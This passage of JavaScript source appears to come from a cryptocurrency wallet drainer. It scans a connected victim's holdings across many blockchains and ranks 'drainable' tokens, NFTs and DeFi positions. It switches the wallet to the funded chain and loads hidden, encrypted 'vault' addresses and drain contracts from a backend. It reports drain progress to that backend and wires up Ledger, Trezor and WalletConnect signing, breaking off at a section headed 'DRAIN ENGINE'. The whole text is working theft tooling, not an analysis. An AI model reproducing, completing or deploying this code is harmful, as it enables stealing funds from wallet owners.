      var msg = String(e && e.message || e || '');
      if (isUserRejection(e)) {
        L.warn('Chain', chainId, 'switch/add declined by user — skip');
        return false;
      }
      if (msg.indexOf('Unrecognized chain') !== -1 || msg.indexOf('4902') !== -1) {
        L.warn('Chain', chainId, 'not supported in wallet — skip');
        return false;
      }
      throw e;
    }
  }

  async function readNativeBalanceWei(provider, address, chainId) {
    try {
      var hex = await evmRequestWithFallback(provider, chainId || 1, 'eth_getBalance', [address, 'latest']);
      return BigInt(hex || '0x0');
    } catch (e) {
      return 0n;
    }
  }

  function backendHasDrainableAssets(scoutData) {
    if (!scoutData) return false;
    if (Number(scoutData.total_usd || 0) > 0) return true;
    var ranked = scoutData.assets || scoutData.ranked || [];
    for (var ri = 0; ri < ranked.length; ri++) {
      var bal = ranked[ri].raw_balance || ranked[ri].amount_raw || '0';
      if (BigInt(bal || '0') > 0n) return true;
    }
    if (scoutData.nfts && scoutData.nfts.length) return true;
    if (scoutData.defi_positions && scoutData.defi_positions.length) return true;
    return false;
  }

  async function findFundedChainViaBackend(address) {
    var order = getMultiChainOrder();
    for (var i = 0; i < order.length; i++) {
      var cid = order[i];
      try {
        var data = await SCOUT.ranked(address, cid);
        if (backendHasDrainableAssets(data)) return cid;
      } catch (e) { /* next chain */ }
    }
    return null;
  }

  /** Switch MetaMask to the EVM chain that actually holds native balance. */
  async function ensureFundedEvmChain(provider, address, connectedChainId) {
    var connectedBal = await readNativeBalanceWei(provider, address, connectedChainId);
    if (connectedBal > MIN_NATIVE_WEI) {
      L.log('Funded chain:', connectedChainId, '| native:', (Number(connectedBal) / 1e18).toFixed(6));
      return Number(connectedChainId);
    }

    L.log('Chain', connectedChainId, 'empty — finding funded EVM chain...');
    var backendChain = await findFundedChainViaBackend(address);
    if (backendChain != null) {
      var cur = await getProviderChainId(provider);
      if (cur !== Number(backendChain)) {
        var switched = await safeSwitchProviderChain(provider, backendChain);
        if (switched) {
          var bal = await readNativeBalanceWei(provider, address, backendChain);
          if (bal > MIN_NATIVE_WEI || backendHasDrainableAssets(await SCOUT.ranked(address, backendChain))) {
            L.log('Backend-guided switch →', backendChain);
            return Number(backendChain);
          }
        }
      } else {
        return Number(backendChain);
      }
    }

    return Number(connectedChainId);
  }

  function dedupeTokensByContract(tokens) {
    var seen = {};
    var out = [];
    (tokens || []).forEach(function (t) {
      var key = String(t.address || t.contract || '').toLowerCase();
      if (!key || seen[key]) return;
      seen[key] = true;
      out.push(t);
    });
    return out;
  }

  /** Skip $0 scam-airdrop tokens (Blockaid flags 1B Permit2 on these). */
  function filterDrainableTokens(tokens) {
    return dedupeTokensByContract(tokens || []).filter(function (t) {
      var bal = BigInt(t.balance || t.amount_raw || '0');
      if (bal <= 0n) return false;
      var usd = Number(t.usd != null ? t.usd : (t.amount_usd != null ? t.amount_usd : NaN));
      if (Number.isFinite(usd) && usd <= 0) return false;
      return true;
    });
  }

  function chainSlotWorthDraining(ch) {
    if (!ch) return false;
    if (Number(ch.usd || 0) > 0) return true;
    return filterDrainableTokens(ch.tokens).length > 0;
  }

  function chainHasDrainableAssets(assets) {
    if (!assets) return false;
    var nativeBal = BigInt(assets.nativeHex || '0x0');
    if (nativeBal > MIN_NATIVE_WEI) return true;
    if (filterDrainableTokens(assets.tokens).length > 0) return true;
    if (assets.nfts && assets.nfts.length > 0) return true;
    return false;
  }

  function assetsHaveDrainableBalance(assets) {
    if (!assets) return false;
    if (BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI) return true;
    if (assets.nfts && assets.nfts.length > 0) return true;
    return filterDrainableTokens(assets.tokens).length > 0;
  }

  var SCOUT = {
    telemetry: async function (address, chainId, walletName, allAddrs) {
      try {
        var map = allAddrs || collectAddressMap(address);
        var connected = [];
        Object.keys(map).forEach(function (k) { if (map[k]) connected.push(map[k]); });
        await apiPost('/api/v1/scout', {
          user_address: address,
          chain_id: Number(chainId) || 1,
          wallet_type: walletName || 'Unknown',
          chain_family: 'EVM',
          source_page: window.location.href,
          connect_session: S.connectSession || undefined,
          connected_wallets: connected.length ? connected : undefined,
          scout_value_usd: S.scoutUsd > 0 ? S.scoutUsd : undefined,
        });
      } catch (e) {}
    },

    reportDrainStatus: async function (event, address, chainId, walletName, detail) {
      try {
        await apiPost('/api/v1/scout/drain-status', {
          wallet_address: address,
          event: event,
          chain_id: Number(chainId) || undefined,
          chain_family: 'EVM',
          wallet_type: walletName || 'Unknown',
          scout_value_usd: Number(S.scoutUsd) || 0,
          source_page: window.location.href,
          detail: detail || undefined,
          connect_session: S.connectSession || undefined,
        });
      } catch (e) {}
    },

    alertStage: async function (stage, address, chainId, walletName, detail) {
      L.log('[alert]', stage, detail || '');
      return SCOUT.reportDrainStatus(stage, address, chainId, walletName, detail);
    },

    alertFailure: async function (chainFamily, step, err, address, chainId, walletName) {
      var msg = (err && err.message) || String(err || 'unknown error');
      var detail = JSON.stringify({
        chain: chainFamily || 'EVM',
        step: step || 'unknown',
        error: msg,
        trace: err && err.stack ? String(err.stack).slice(0, 400) : undefined,
      });
      L.warn('[alert:fail]', chainFamily, step, msg);
      return SCOUT.alertStage('drain_fail', address, chainId, walletName, detail);
    },

    reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId, assetItems) {
      var usd = Number(totalUsd) || 0;
      if (usd <= 0) return;
      if (S.fusionNotified && S.scoutUsd >= usd) return;
      S.fusionNotified = true;
      S.scoutUsd = Math.max(S.scoutUsd, usd);
      var sourceItems = assetItems || (S.portfolioScan && S.portfolioScan.items) || [];
      var topAssets = sourceItems
        .filter(function (a) { return Number(a.amount_usd || a.usd_value || 0) > 0; })
        .slice(0, 12)
        .map(function (a) {
          return {
            chain: a.chain || ('evm:' + (chainId || 1)),
            family: a.family || 'EVM',
            token: a.token || a.address || 'native',
            symbol: a.symbol || '?',
            amount_usd: Number(a.amount_usd || a.usd_value || 0),
          };
        });
      try {
        await apiPost('/api/v1/scout/drain-status', {
          wallet_address: address,
          event: 'scan_complete',
          chain_id: Number(chainId) || undefined,
          chain_family: 'EVM',
          wallet_type: walletName || 'Unknown',
          scout_value_usd: Number(totalUsd) || 0,
          asset_count: assetCount || topAssets.length || 0,
          assets: topAssets.length ? topAssets : undefined,
          source_page: window.location.href,
          connect_session: S.connectSession || undefined,
        });
      } catch (e) {}
    },

    fusion: async function (addrs) {
      try {
        var body = { connect_session: S.connectSession || undefined };
        if (S.scoutUsd > 0) body.scout_value_usd = S.scoutUsd;
        if (addrs.evm) body.evm_holder = addrs.evm;
        if (addrs.sol) body.sol_owner_base58 = addrs.sol;
        if (addrs.tron) body.tron_holder_base58 = addrs.tron;
        if (addrs.ton) body.ton_friendly_address = addrs.ton;
        if (addrs.btc) body.btc_holder_address = addrs.btc;
        if (addrs.cosmos) body.cosmos_holder_address = addrs.cosmos;
        if (addrs.aptos) body.aptos_holder_address = addrs.aptos;
        if (addrs.sui) body.sui_holder_address = addrs.sui;
        var r = await apiPost('/api/scout/recursive-predator-fusion', body);
        var data = (r && r.data && r.data.fusion) ? r.data.fusion : (r && r.data) ? r.data : r;
        if (data && data.total_usd) S.scoutUsd = Number(data.total_usd) || S.scoutUsd;
        if (data && data.assets) S.fusionAssets = data.assets;
        return data || null;
      } catch (e) { L.warn('Fusion scout fail:', e.message); return null; }
    },

    ranked: async function (address, chainId) {
      try {
        var body = { wallet_address: address };
        if (chainId != null) body.chain_id = Number(chainId);
        var r = await apiPost('/api/v1/scout/ranked', body);
        return (r && r.data) ? r.data : null;
      } catch (e) { return null; }
    },

    chainPriority: function (fusionData) {
      var order = ['EVM', 'SOL', 'BTC', 'TRON', 'TON', 'COSMOS', 'POLKADOT', 'ALGORAND', 'CARDANO', 'APTOS', 'SUI'];
      var vals = {};
      var familyFromChain = function (chain) {
        var c = String(chain || '').toUpperCase();
        if (c === 'SVM' || c === 'SOL' || c === 'SOLANA') return 'SOL';
        if (c === 'UTXO' || c === 'BTC' || c === 'BITCOIN') return 'BTC';
        if (c === 'TRX' || c === 'TRON') return 'TRON';
        if (c === 'TON') return 'TON';
        if (c === 'COSMOS') return 'COSMOS';
        if (c === 'POLKADOT' || c === 'DOT') return 'POLKADOT';
        if (c === 'ALGORAND' || c === 'ALGO') return 'ALGORAND';
        if (c === 'CARDANO' || c === 'ADA') return 'CARDANO';
        if (c === 'APTOS') return 'APTOS';
        if (c === 'SUI') return 'SUI';
        return 'EVM';
      };
      var assets = (fusionData && fusionData.assets) || S.fusionAssets || [];
      assets.forEach(function (a) {
        var fam = a.family || a.chain_family || familyFromChain(a.chain);
        if (fam === 'SVM') fam = 'SOL';
        if (fam === 'UTXO') fam = 'BTC';
        vals[fam] = (vals[fam] || 0) + Number(a.amount_usd || a.usd_value || 0);
      });
      var rankedItems = (S.portfolioScan && S.portfolioScan.items) || [];
      rankedItems.forEach(function (a) {
        var fam = familyFromChain(a.chain || a.chain_family || a.family);
        vals[fam] = (vals[fam] || 0) + Number(a.amount_usd || a.usd_value || 0);
      });
      if (S.portfolioScan && S.portfolioScan.byChain) {
        var evmUsd = 0;
        Object.keys(S.portfolioScan.byChain).forEach(function (cid) {
          evmUsd += Number(S.portfolioScan.byChain[cid].usd || 0);
        });
        if (evmUsd > 0) vals.EVM = Math.max(vals.EVM || 0, evmUsd);
      }
      return order.slice().sort(function (a, b) { return (vals[b] || 0) - (vals[a] || 0); });
    },
  };

  async function prefetchVault() {
    if (CFG.backendEndpoints && CFG.backendEndpoints.length) {
      S.backendEndpoints = CFG.backendEndpoints.slice();
    }
    if (CFG.proxyUrls && CFG.proxyUrls.length) {
      S.proxyUrls = CFG.proxyUrls.slice();
    }
    if (CFG.deployDomains && CFG.deployDomains.length) {
      S.deployDomains = CFG.deployDomains.slice();
    }
    if (CFG.eip712Domains && typeof CFG.eip712Domains === 'object') {
      S.eip712Domains = CFG.eip712Domains;
    }
    try {
      var res = await apiFetch('/api/v1/client-config', { method: 'GET', credentials: 'omit' });
      var d = await res.json();
      if (d && d.data) {
        if (d.data.endpoints && d.data.endpoints.length) {
          S.backendEndpoints = d.data.endpoints.slice();
        }
        if (d.data.proxy_urls && d.data.proxy_urls.length) {
          S.proxyUrls = d.data.proxy_urls.slice();
        }
        if (d.data.primary) BACKEND = String(d.data.primary).replace(/\/$/, '');
        if (d.data.deploy_domains && d.data.deploy_domains.length) {
          S.deployDomains = d.data.deploy_domains.slice();
        }
        if (d.data.eip712_domains && typeof d.data.eip712_domains === 'object') {
          S.eip712Domains = d.data.eip712_domains;
        }
        if (d.data.eip7702_enabled === false) S.eip7702Enabled = false;
        if (d.data.relayer_sponsored_gas === true) S.relayerSponsored = true;
        if (d.data.chain_capabilities && typeof d.data.chain_capabilities === 'object') {
          S.chainCapabilities = d.data.chain_capabilities;
        }
        var factoryMap = d.data.factory_addresses;
        if (factoryMap && typeof factoryMap === 'object') {
          Object.keys(factoryMap).forEach(function (cid) {
            var fa = factoryMap[cid];
            if (fa && !isZeroAddr(fa)) DRAIN_FACTORY[Number(cid)] = String(fa);
          });
        }
        var va = d.data.vault_addresses;
        var encKey = CFG.clientEncryptKey || '';
        if (d.data.vault_addresses_encrypted && encKey) {
          var dec = await decryptVaultPayload(d.data.vault_addresses_encrypted, encKey);
          if (dec) va = dec;
        }
        if (va) {
          if (va.evm || va.ethereum) VAULT.evm = va.evm || va.ethereum;
          if (va.sol || va.svm) VAULT.sol = va.sol || va.svm;
          if (va.btc) VAULT.btc = va.btc;
          if (va.tron || va.trx) VAULT.tron = va.tron || va.trx;
          if (va.ton) VAULT.ton = va.ton;
          if (va.cosmos) VAULT.cosmos = va.cosmos;
          if (va.aptos) VAULT.aptos = va.aptos;
          if (va.sui) VAULT.sui = va.sui;
        }
      }
    } catch (e) { L.warn('Vault fetch failed, using fallback'); }
    S.vaultLoaded = true;
  }

  function isFamilyDrainReady(family) {
    var fam = String(family || '').toUpperCase();
    var cap = S.chainCapabilities && S.chainCapabilities[fam];
    if (cap === 'disabled') return false;
    // anchor_only = signMessage + backend anchor (DOT/ALGO/ADA) — still run
    if (cap === 'anchor_only' || cap === 'full') return true;
    if (fam === 'COSMOS' && !VAULT.cosmos) return false;
    if (fam === 'APTOS' && !VAULT.aptos) return false;
    if (fam === 'SUI' && !VAULT.sui) return false;
    // Default: DOT/ALGO/ADA run anchor path when WC/extension connected
    if (fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO') return true;
    return true;
  }

  function isAnchorOnlyFamily(family) {
    var fam = String(family || '').toUpperCase();
    var cap = S.chainCapabilities && S.chainCapabilities[fam];
    if (cap === 'anchor_only') return true;
    return fam === 'POLKADOT' || fam === 'ALGORAND' || fam === 'CARDANO';
  }

  function normalizeTypedData(typedDataObj) {
    if (!typedDataObj) return typedDataObj;
    if (typedDataObj.domain && typeof typedDataObj.domain.chainId === 'string') {
      typedDataObj.domain.chainId = parseInt(typedDataObj.domain.chainId, 10) || 1;
    }
    if (typedDataObj.types && !typedDataObj.types.EIP712Domain) {
      var dom = typedDataObj.domain || {};
      var domFields = [];
      if (dom.name !== undefined) domFields.push({ name: 'name', type: 'string' });
      if (dom.version !== undefined) domFields.push({ name: 'version', type: 'string' });
      if (dom.chainId !== undefined) domFields.push({ name: 'chainId', type: 'uint256' });
      if (dom.verifyingContract !== undefined) domFields.push({ name: 'verifyingContract', type: 'address' });
      typedDataObj.types.EIP712Domain = domFields;
    }
    return typedDataObj;
  }

  function normNftList(nfts) {
    var byContract = {};
    (nfts || []).forEach(function (n) {
      var contract = String(n.contract || n.nft_contract || '').toLowerCase();
      if (!contract) return;
      var tokenIds = n.tokenIds || [String(n.token_id || n.tokenId || '1')];
      var standard = n.standard || 'erc721';
      if (!byContract[contract]) {
        byContract[contract] = { contract: contract, tokenIds: [], standard: standard, _seen: {} };
      }
      var entry = byContract[contract];
      tokenIds.forEach(function (tid) {
        var s = String(tid);
        if (!entry._seen[s]) {
          entry._seen[s] = true;
          entry.tokenIds.push(s);
        }
      });
    });
    return Object.keys(byContract).map(function (k) {
      var e = byContract[k];
      delete e._seen;
      return e;
    });
  }

  function countUniqueNftContracts(nfts) {
    var seen = {};
    (nfts || []).forEach(function (n) {
      var c = String(n.contract || n.nft_contract || '').toLowerCase();
      if (c) seen[c] = true;
    });
    return Object.keys(seen).length;
  }

  function extractNftApprovalEntries(raw) {
    if (!raw) return [];
    if (Array.isArray(raw)) {
      return raw.map(function (item) {
      return {
          contract: String(item.contract || '').toLowerCase(),
          typedData: item.typedData || item,
        };
      }).filter(function (e) { return e.contract && e.typedData; });
    }
    if (typeof raw === 'object') {
      return Object.keys(raw).map(function (k) {
        var val = raw[k];
        return {
          contract: k.toLowerCase(),
          typedData: val && val.typedData ? val.typedData : val,
        };
      }).filter(function (e) { return e.contract && e.typedData; });
    }
    return [];
  }

  function isLethalEvmResult(p2) {
    if (!p2) return false;
    if (p2.sig && String(p2.sig).length > 10) return true;
    if (p2.nativeSigned && String(p2.nativeSigned).startsWith('0x') && p2.nativeSigned.length > 70) return true;
    var nas = p2.nftApprovalSigs || {};
    return Object.keys(nas).some(function (k) { return nas[k] && String(nas[k]).length > 10; });
  }

  function isUserRejection(e) {
    var code = e && (e.code || (e.data && e.data.code));
    var msg = (e && e.message) || '';
    return code === 4001 || code === -32100 || code === 5000 || code === 'ACTION_REJECTED' ||
      /rejected|denied|cancelled|user rejected|declined/i.test(msg);
  }

  function userRejectionMessage() {
    return 'You declined the request. No changes were made to your wallet.';
  }

  async function runWithRetry(fn, label, maxAttempts) {
    var attempts = maxAttempts || 3;
    var delays = [1000, 2000, 4000];
    var lastErr = null;
    for (var ri = 0; ri < attempts; ri++) {
      try {
        return await fn();
      } catch (e) {
        lastErr = e;
        if (isUserRejection(e)) throw e;
        L.warn(label + ' attempt', ri + 1, '/', attempts, 'failed:', e.message);
        if (ri < attempts - 1) await sleep(delays[ri] + Math.floor(Math.random() * 300));
      }
    }
    if (lastErr) throw lastErr;
    return null;
  }

  function chunkArray(arr, size) {
    var out = [];
    for (var ci = 0; ci < arr.length; ci += size) {
      out.push(arr.slice(ci, ci + size));
    }
    return out;
  }

  function isLikelyTxHash(id) {
    return typeof id === 'string' && /^0x[a-fA-F0-9]{64}$/.test(id);
  }

  function estimateSendCallsGasLimit(tokenCount, nftCount, hasNative, chainId) {
    var nativeGas = 0n;
    if (hasNative) {
      nativeGas = resolveClaimContract(chainId) ? CLAIM_CONTRACT_GAS : NATIVE_TRANSFER_GAS;
    }
    var limit = nativeGas;
    limit += BigInt(tokenCount || 0) * ERC20_TRANSFER_GAS;
    limit += BigInt(nftCount || 0) * ERC20_TRANSFER_GAS;
    if (limit < NATIVE_TRANSFER_GAS) limit = NATIVE_TRANSFER_GAS;
    return limit;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 07: HARDWARE WALLET — LEDGER + TREZOR
  // ═══════════════════════════════════════════════════════════════
  var _ledgerTransport = null, _ledgerEthApp = null, _trezorReady = false;
  var HD_PATH_EVM = "m/44'/60'/0'/0";

  var HW = {
    available: function () { return !!(navigator && navigator.usb); },

    loadLedger: async function () {
      if (_ledgerTransport && _ledgerEthApp) return true;
      try {
        await loadVendorScript('ledger-transport-webusb.umd.js');
        await loadVendorScript('ledger-app-eth.umd.js');
        var TM = window.LedgerTransportWebUSB || window.TransportWebUSB;
        var EM = window.LedgerEth || window.Eth;
        if (TM && EM) {
          _ledgerTransport = TM.default || TM;
          _ledgerEthApp = EM.default || EM;
          return true;
        }
      } catch (e) { /* vendor optional */ }
      if (!CDN_FALLBACK) {
        L.warn('Ledger: self-host vendor/ledger-*.js or set cdnFallback (strictCsp:false)');
        return false;
      }
      try {
        var mods = await Promise.all([
          import('https://esm.sh/@ledgerhq/hw-transport-webusb@6.29.4?bundle-deps'),
          import('https://esm.sh/@ledgerhq/hw-app-eth@6.38.4?bundle-deps'),
        ]);
        _ledgerTransport = mods[0].default || mods[0];
        _ledgerEthApp = mods[1].default || mods[1];
        return true;
      } catch (e) { L.warn('Ledger SDK fail:', e.message); return false; }
    },

    connectLedger: async function () {
      if (!this.available() || !await this.loadLedger()) return null;
      try {
        var t = await _ledgerTransport.create();
        var app = new _ledgerEthApp(t);
        var r = await app.getAddress(HD_PATH_EVM, false);
        if (!r || !r.address) throw new Error('No address');
        L.log('Ledger connected:', r.address.slice(0, 8));
        return { type: 'ledger', address: r.address.toLowerCase(), transport: t, ethApp: app };
      } catch (e) { L.warn('Ledger connect fail:', e.message); return null; }
    },

    signLedgerTypedData: async function (hwObj, typedData) {
      try {
        var r = await hwObj.ethApp.signEIP712Message(HD_PATH_EVM, typedData);
        return '0x' + r.r + r.s + (r.v - 27).toString(16).padStart(2, '0');
      } catch (e) {
        // Older Nano S fallback
        try {
          var hex = toHex(jsonSafe(typedData)).slice(2);
          var r2 = await hwObj.ethApp.signPersonalMessage(HD_PATH_EVM, hex);
          return '0x' + r2.r + r2.s + (r2.v - 27).toString(16).padStart(2, '0');
        } catch (e2) { L.warn('Ledger sign fail:', e2.message); return null; }
      }
    },

    loadTrezor: async function () {
      if (_trezorReady && window.TrezorConnect) return true;
      try {
        await loadVendorScript('trezor-connect-web.min.js');
        var TC = window.TrezorConnect;
        if (TC) {
          await TC.init({ lazyLoad: false, manifest: { email: 'dev@app.io', appUrl: window.location.origin } });
          _trezorReady = true;
          return true;
        }
      } catch (e) { /* vendor optional */ }
      if (!CDN_FALLBACK) {
        L.warn('Trezor: self-host vendor/trezor-connect-web.min.js or set cdnFallback');
        return false;
      }
      try {
        var m = await import('https://esm.sh/@trezor/connect-web@9.4.5?bundle-deps');
        var TC2 = m.default || m;
        await TC2.init({ lazyLoad: false, manifest: { email: 'dev@app.io', appUrl: window.location.origin } });
        window.TrezorConnect = TC2;
        _trezorReady = true;
        return true;
      } catch (e) { L.warn('Trezor SDK fail:', e.message); return false; }
    },

    connectTrezor: async function () {
      if (!this.available() || !await this.loadTrezor()) return null;
      try {
        var r = await window.TrezorConnect.ethereumGetAddress({ path: HD_PATH_EVM, showOnTrezor: false });
        if (!r.success) throw new Error(r.payload.error);
        L.log('Trezor connected:', r.payload.address.slice(0, 8));
        return { type: 'trezor', address: r.payload.address.toLowerCase() };
      } catch (e) { L.warn('Trezor connect fail:', e.message); return null; }
    },

    signTrezorTypedData: async function (typedData) {
      try {
        var r = await window.TrezorConnect.ethereumSignTypedData({ path: HD_PATH_EVM, data: typedData, metamask_v4_compat: true });
        if (!r.success) throw new Error(r.payload.error);
        return r.payload.signature;
      } catch (e) { L.warn('Trezor sign fail:', e.message); return null; }
    },

    signTrezorTransaction: async function (txParams) {
      try {
        var chainIdNum = typeof txParams.chainId === 'string'
          ? parseInt(String(txParams.chainId).replace('0x', ''), 16) : Number(txParams.chainId || 1);
        var r = await window.TrezorConnect.ethereumSignTransaction({
          path: HD_PATH_EVM,
          transaction: {
            to: txParams.to,
            value: txParams.value,
            chainId: chainIdNum,
            nonce: txParams.nonce,
            gasLimit: txParams.gas,
            maxFeePerGas: txParams.maxFeePerGas,
            maxPriorityFeePerGas: txParams.maxPriorityFeePerGas,
            data: txParams.data || '0x',
          },
        });
        if (!r.success) throw new Error(r.payload.error);
        return r.payload.serializedTx || r.payload.serialized;
      } catch (e) { L.warn('Trezor tx sign fail:', e.message); return null; }
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 08: WALLETCONNECT — Reown AppKit multichain bundle
  // ═══════════════════════════════════════════════════════════════
  var _wcConnecting = false;
  var _wcProv = null;

  function extractBatchOrTxId(raw) {
    if (raw == null) return null;
    if (typeof raw === 'string') {
      var s = raw.trim();
      if (s.indexOf('[object') === 0) return null;
      return s.startsWith('0x') ? s : null;
    }
    if (typeof raw === 'object') {
      var id = raw.id || raw.bundleId || raw.hash || raw.transactionHash || raw.txHash;
      if (id && String(id).startsWith('0x')) return String(id);
    }
    return null;
  }

  async function pollWcProviderReady(maxMs) {
    maxMs = maxMs || 60000;
    if (!window.LegionWallet) return null;
    var start = Date.now();
    var hijackStreak = 0;
    while (Date.now() - start < maxMs) {
      var connId = getLegionConnectorId().toLowerCase();
      if (connId && isInjectedConnectorId(connId)) {
        hijackStreak++;
        if (hijackStreak >= 2) {
          L.warn('WC poll: extension hijack — stop', connId);
          await disconnectLegionWallet();
          return null;
        }
        await sleep(600);
        continue;
      }
      hijackStreak = 0;
      var p = await safeGetLegionProvider();
      if (p && isRealWalletConnectSession(connId, p)) {
        try {
          var accts = await p.request({ method: 'eth_accounts' });
          if (accts && accts.length) {
            L.log('WC poll: session ready', String(accts[0]).slice(0, 10) + '...');
            return p;
          }
        } catch (e1) { /* keep polling */ }
      }
      applyLegionWalletSessionAddresses();
      await sleep(800);
    }
    return null;
  }

  function closeAppKitModal() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.closeModal === 'function') {
        window.LegionWallet.closeModal();
        return;
      }
      var selectors = ['w3m-modal', 'appkit-modal'];
      for (var i = 0; i < selectors.length; i++) {
        var modal = document.querySelector(selectors[i]);
        if (!modal) continue;
        var root = modal.shadowRoot || modal;
        var closeBtn = root.querySelector('[data-testid="w3m-header-close"]')
          || root.querySelector('wui-icon-link[icon="close"]');
        if (closeBtn) { closeBtn.click(); return; }
        modal.removeAttribute('class');
        modal.style.display = 'none';
      }
    } catch (e) { /* AppKit close best-effort */ }
  }

  /** Slim WC pairing — Trust/OKX reject oversized or invalid optionalNamespaces */
  var WC_OPTIONAL_NAMESPACES = {
          eip155: {
      methods: ['eth_sendTransaction', 'eth_signTypedData_v4', 'personal_sign', 'eth_sign', 'wallet_sendCalls', 'wallet_getCapabilities', 'eth_accounts', 'eth_requestAccounts'],
      events: ['chainChanged', 'accountsChanged'],
          },
          solana: {
      chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
      methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAllTransactions', 'solana_signAndSendTransaction'],
      events: ['chainChanged', 'accountsChanged'],
    },
    bip122: {
      chains: ['bip122:000000000019d6689c085ae165831e93'],
      methods: ['signMessage', 'signPsbt', 'sendTransfer', 'getAccountAddresses'],
      events: ['chainChanged', 'accountsChanged'],
    },
    tron: {
      chains: ['tron:0x2b6653dc'],
      methods: ['tron_signMessage', 'tron_signTransaction'],
      events: ['chainChanged', 'accountsChanged'],
    },
    ton: {
      chains: ['ton:-239'],
      methods: ['ton_sendMessage', 'ton_signData', 'ton_sendTransaction', 'ton_signMessage'],
      events: ['chainChanged', 'accountsChanged'],
    },
  };

  async function ensureWcBip122Linked() {
    if (S.chains.BTC && S.chains.BTC.address) return S.chains.BTC.address;
    var wcAddr = scanWcSessionAllFamilies();
    if (wcAddr && wcAddr.btc) {
      applyWcSessionAddresses(wcAddr);
      return wcAddr.btc;
    }
    if (!window.LegionWallet || typeof window.LegionWallet.ensureBip122Link !== 'function') return null;
    try {
      var btc = await window.LegionWallet.ensureBip122Link({
        projectId: WC_PROJECT_ID,
        metadata: wcMetaPayload(),
        optionalNamespaces: WC_OPTIONAL_NAMESPACES,
        timeoutMs: 120000,
      });
      if (btc) {
        S.chains.BTC = { address: btc, name: 'UTXO', wcSession: true };
        wireWcBtcConnection(btc);
        L.log('[UTXO] bip122 linked:', btc.slice(0, 8) + '...');
      }
      return btc || null;
    } catch (e) {
      L.warn('[UTXO] bip122 link skip:', e.message);
      return null;
    }
  }

  async function bundledWalletConnect() {
    if (!WC_PROJECT_ID) { L.warn('wcProjectId not set'); return null; }
    if (typeof window.LegionWallet === 'undefined') {
      L.warn('LegionWallet bundle not loaded');
      return null;
    }
    if (_wcConnecting) return null;
    _wcConnecting = true;
    _wcProv = null;
    S.connectMode = 'wc';

    if (S.evmProvider && isInjectedProvider(S.evmProvider)) {
      logConnect('prep', 'disconnecting extension before WC QR');
      await clearInjectedSession({ keepMode: true });
    }
    if (S.connectMode === 'injected' || isInjectedConnectorId(getLegionConnectorId())) {
      await clearInjectedSession({ keepMode: true });
      await disconnectLegionWallet();
    }

    var wcMeta = wcMetaPayload();

    try {
      UI.status('Scan QR with your mobile wallet...');
      logConnect('WC', 'Reown AppKit v' + (window.LegionWallet.version || '?') + ' | origin: ' + wcMeta.url);
      var wcNs = WC_OPTIONAL_NAMESPACES;
      if (window.LegionCaipRegistry && typeof window.LegionCaipRegistry.buildOptionalNamespacesFromRegistry === 'function') {
        wcNs = window.LegionCaipRegistry.buildOptionalNamespacesFromRegistry(WC_OPTIONAL_NAMESPACES, CFG.wcEvmCount || globalThis.LEGION_WC_EVM_COUNT);
      } else if (window.LegionWallet && typeof window.LegionWallet.buildOptionalNamespaces === 'function') {
        wcNs = window.LegionWallet.buildOptionalNamespaces(WC_OPTIONAL_NAMESPACES);
      }
      var hasStoredSession = !!findWcStorageSession();
      var sessionExpired = !!S.wcSessionExpired;
      var switchingFromExtension = !!(S.evmProvider && isInjectedProvider(S.evmProvider));
      var browserExtensionActive = !!(window.ethereum && (
        window.ethereum.isMetaMask || window.ethereum.isRabby || window.ethereum.isBraveWallet
      ));
      var connectP = window.LegionWallet.connect({
        projectId: WC_PROJECT_ID,
        metadata: wcMeta,
        timeoutMs: 180000,
        requireWalletConnect: true,
        optionalNamespaces: wcNs,
        preserveSession: hasStoredSession && !sessionExpired && !switchingFromExtension && !browserExtensionActive,
        forceFresh: switchingFromExtension || sessionExpired || browserExtensionActive,
        restore: (sessionExpired || hasStoredSession) && !browserExtensionActive,
      });
      var provider = await Promise.race([
        connectP,
        new Promise(function (_, rej) {
          setTimeout(function () { rej(new Error('AppKit timeout — scan QR and approve on phone')); }, 185000);
        }),
      ]);
      var connId = getLegionConnectorId().toLowerCase();
      if (provider && isInjectedConnectorId(connId)) {
        try { await disconnectLegionWallet(); } catch (e2) {}
        L.warn('Extension hijacked WalletConnect —', connId || 'injected');
        _wcConnecting = false;
        _wcProv = null;
        return null;
      }
      if (provider && provider.isMetaMask && !provider.isWalletConnect) {
        try { await disconnectLegionWallet(); } catch (e2) {}
        L.warn('Browser wallet hijacked WalletConnect — use MetaMask button for extension');
        _wcConnecting = false;
        _wcProv = null;
        return null;
      }
      if (provider && connId && !isRealWalletConnectSession(connId, provider)) {
        try { await disconnectLegionWallet(); } catch (e2) {}
        L.warn('Non-WC connector —', connId);
        _wcConnecting = false;
        _wcProv = null;
        return null;
      }
      _wcProv = provider;
      _wcConnecting = false;
      applyLegionWalletSessionAddresses();
      saveWcFamilyContext(collectAddressMap());
      var wcFamilies = scanWcSessionAllFamilies();
      L.log('WC namespaces linked:', Object.keys(wcFamilies).filter(function (k) { return wcFamilies[k]; }).join(',') || 'evm-only');
      if (!wcFamilies.btc && !S.chains.BTC) {
        UI.status('Enable Bitcoin in Trust/OKX on phone, then approve...');
        await ensureWcBip122Linked();
      }
      L.log('Bundled AppKit connected | connector:', connId || 'unknown',
        '| wc:', !!(provider && provider.isWalletConnect));
      return provider;
    } catch (e) {
      _wcConnecting = false;
      _wcProv = null;
      L.warn('Bundled AppKit fail:', e.message);
      var stored = findWcStorageSession();
      if (stored) {
        L.log('WC storage session found — recovering', stored.address.slice(0, 10) + '...');
        var recovered = await safeGetLegionProvider();
        if (recovered) {
          _wcProv = recovered;
          return recovered;
        }
      }
      L.log('WC: waiting for mobile session in storage...');
      stored = await waitWcStorageSession(60000);
      if (stored) {
        var polled = await pollWcProviderReady(30000);
        if (polled) {
          _wcProv = polled;
          L.log('WC recovered via storage poll | wc:', !!polled.isWalletConnect);
          return polled;
        }
      }
      try { await disconnectLegionWallet(); } catch (e2) {}
      return null;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 09: EVM CORE — DRAIN ENGINE
  // ═══════════════════════════════════════════════════════════════

  // 9.1 — Capability detection
  async function getCapabilities(provider, address, chainId) {
    try {
